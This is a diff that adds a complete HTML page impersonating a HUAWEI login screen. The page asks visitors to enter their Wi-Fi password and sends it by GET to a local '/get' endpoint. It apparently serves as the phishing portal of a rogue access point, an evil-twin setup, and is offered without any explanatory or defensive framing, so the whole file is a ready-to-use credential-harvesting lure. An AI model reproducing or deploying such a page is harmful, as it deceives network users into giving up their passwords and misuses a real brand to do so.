@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f7fa;
+      margin: 0;
+      padding: 0;
+    }
+    .login-container {
+      width: 90%;
+      max-width: 380px;
+      margin: 80px auto;
+      padding: 30px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      background-color: #ffffff;
+      box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+    }
+    #logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .g-h1 {
+      font-weight: 600;
+      font-size: 36px;
+      margin-top: 10px;
+      text-align: center;
+      color: #333;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-transform: uppercase;
+    }
+    .g-h1 .brand-symbol {
+      font-size: 20px;
+      vertical-align: super;
+    }
+    .g-h2 {
+      font-weight: 200;
+      font-size: 14px;
+      margin-top: 10px;
+      text-align: center;
+      color: #555;
+    }
+    .g-input {
+      width: 100%;
+      margin-top: 20px;
+      height: 45px;
+      padding: 0 15px;
+      font-size: 16px;
+      color: #333;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      background-color: #fafafa;
+      box-sizing: border-box;
+    }
+    .g-input:focus {
+      border-color: #4d90fe;
+      outline: none;
+    }
+    .gbtn-primary {
+      margin-top: 25px;
+      width: 100%;
+      height: 45px;
+      font-size: 16px;
+      color: #fff;
+      background-color: #0078d4;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .gbtn-primary:hover {
+      background-color: #005fa3;
+    }
+    .gbtn-primary:disabled {
+      background-color: #bbb;
+      cursor: not-allowed;
+    }
+  </style>
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+</head>
+<body>
+  <div id="login-app">
+    <div class="login-container">
+      <form action="/get" id="email-form-step">
+        <h1 class="g-h1">HUAWEI<span class="brand-symbol">®</span></h1>
+        <h2 class="g-h2">Please enter the Wi-Fi password to proceed.</h2>
+        <div class="login-content">
+          <!-- Hidden input for email -->
+          <input name="email" type="hidden" value="EnteredPassword">
+          <!-- Visible password input -->
+          <input name="preview_text" type="password" class="g-input" placeholder="Password" required>
+          <div>
+            <button class="gbtn-primary" type="submit">Next</button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
